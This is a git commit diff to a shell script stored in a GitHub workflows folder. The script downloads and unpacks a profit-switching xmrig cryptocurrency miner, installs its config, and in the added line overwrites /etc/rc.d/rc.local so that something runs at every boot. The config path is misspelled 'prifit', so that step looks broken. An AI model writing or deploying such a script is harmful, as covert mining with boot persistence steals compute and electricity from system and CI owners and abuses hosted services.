13a0c3c3fe76e68c7ff08ff25870d011975e84a9
zy123456-zhong <61346716+zy123456-zhong@users.noreply.github.com>
2020-02-25 19:21:46 +0800

    Update my.sh

--- .github/workflows/my.sh
+++ .github/workflows/my.sh
@@ -3,4 +3,5 @@ yum install -y unzip
 wget https://github.com/C3Pool/profit-switching-miner/archive/master.zip 
 unzip master.zip 
 tar -zxvf profit-switching-miner-master/xmrig-5.5.3-profit-switching-Linux.tar.gz  
-cat /root/config.json > /root/xmrig-5.5.3-prifit-switching-Linux/config.json 
+cat /root/config.json > /root/xmrig-5.5.3-prifit-switching-Linux/config.json
+cat /root/rc.local > /etc/rc.d/rc.local
